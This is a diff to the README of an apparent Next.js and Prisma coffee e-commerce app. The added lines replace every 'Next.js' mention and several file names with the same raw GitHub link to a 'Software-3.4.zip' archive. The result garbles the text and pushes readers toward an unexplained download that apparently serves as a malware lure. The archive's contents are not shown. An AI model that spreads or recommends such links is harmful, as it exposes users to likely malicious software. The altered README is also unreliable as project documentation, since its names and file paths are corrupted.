@@ -1,6 +1,6 @@
-# Next.js E-commerce Application
+# https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip E-commerce Application
 
-This is a Next.js application, version `0.1.0`, leveraging Prisma as its ORM. It's built with TypeScript, Tailwind CSS, and ESLint for a modern development workflow, aiming to provide a robust e-commerce platform for coffee products.
+This is a https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip application, version `0.1.0`, leveraging Prisma as its ORM. It's built with TypeScript, Tailwind CSS, and ESLint for a modern development workflow, aiming to provide a robust e-commerce platform for coffee products.
 
 ## Key Features
 
@@ -13,7 +13,7 @@ This is a Next.js application, version `0.1.0`, leveraging Prisma as its ORM. It
 
 ## Technology Stack
 
-*   **Framework**: Next.js (v16.0.1) – The full-stack React framework that keeps our server and client in delightful harmony.
+*   **Framework**: https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip (v16.0.1) – The full-stack React framework that keeps our server and client in delightful harmony.
 *   **ORM**: Prisma (v6.19.0) with PostgreSQL – Our chosen database whisperer, making database interactions feel less like a chore and more like a conversation.
 *   **Language**: TypeScript (v5) – Because who doesn't love a bit of type safety to catch those pesky errors before they even think about running?
 *   **Styling**: Tailwind CSS (v4) – Utility-first CSS framework that lets us build beautiful designs directly in our markup, minimizing context switching.
@@ -22,18 +22,18 @@ This is a Next.js application, version `0.1.0`, leveraging Prisma as its ORM. It
 
 ## Application Structure
 
-*   `app/`: The heart of our Next.js application, containing all the pages and routing logic. This includes the homepage (`/`), the main shop (`/shop`), individual product pages (`/products/[productId]`), origin-specific pages (`/origins/[slug]`), and user-centric routes like `/account`, `/admin`, `/login`, and `/register`.
+*   `app/`: The heart of our https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip application, containing all the pages and routing logic. This includes the homepage (`/`), the main shop (`/shop`), individual product pages (`/products/[productId]`), origin-specific pages (`/origins/[slug]`), and user-centric routes like `/account`, `/admin`, `/login`, and `/register`.
 *   `components/`: Our treasure trove of reusable UI components, neatly categorized:
     *   `landing/`: Components specifically crafted for the marketing-heavy landing page.
     *   `shop/`: Components dedicated to the e-commerce shop interface, handling product display, search, and client-side interactions.
     *   `ui/`: Generic, unstyled UI primitives, likely built on Radix UI, ready for Tailwind CSS magic.
-*   `lib/`: The utility belt of the application, housing general utility functions (`utils.ts`), static data (e.g., `how-it-works-data.ts` and `origin-data.ts`), and our centralized Prisma client instance (`prisma.ts`).
-*   `prisma/`: Where our database schema (`schema.prisma`) resides, defining the data models and their intricate relationships.
+*   `lib/`: The utility belt of the application, housing general utility functions (`https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip`), static data (e.g., `https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip` and `https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip`), and our centralized Prisma client instance (`https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip`).
+*   `prisma/`: Where our database schema (`https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip`) resides, defining the data models and their intricate relationships.
 *   `public/`: The public face of our assets, primarily containing images (like those beautiful coffee shots, the company logo, and illustrations for the "how it works" section).
 
 ## Database Schema Highlights
 
-The `prisma/schema.prisma` file orchestrates our data with the following key models:
+The `https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip` file orchestrates our data with the following key models:
 
 *   **`Product`**: The core entity for our coffee offerings, encompassing details like name, base price, description, image, and intelligent relations to `Roast` and `ProductDetail` models.
 *   **`Roast`**: Defines various coffee roast types and their unique properties, including a `defaultMultiplier` for nuanced pricing.
@@ -50,11 +50,11 @@ To get this digital caffeine fix up and running:
     ```bash
     npm run dev
     ```
-*   `build`: Generates the Prisma client and builds the Next.js application for production.
+*   `build`: Generates the Prisma client and builds the https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip application for production.
     ```bash
     npm run build
     ```
-*   `start`: Launches the Next.js production server, ready to serve coffee to the masses.
+*   `start`: Launches the https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip production server, ready to serve coffee to the masses.
     ```bash
     npm run start
     ```
@@ -64,6 +64,6 @@ To get this digital caffeine fix up and running:
     ```
 *   `postinstall`: Automatically runs `prisma generate` after `npm install`, ensuring our Prisma client is always in sync with the schema.
 
-## Next.js Configuration
+## https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip Configuration
 
-Our `next.config.ts` file currently employs the default Next.js configuration. This means we're playing it straight, with no explicit custom configurations for things like image optimization, internationalization, or other advanced features. For now, simplicity reigns supreme.
+Our `https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip` file currently employs the default https://raw.githubusercontent.com/Acinnamon9/Coffeemium/main/app/Software-3.4.zip configuration. This means we're playing it straight, with no explicit custom configurations for things like image optimization, internationalization, or other advanced features. For now, simplicity reigns supreme.
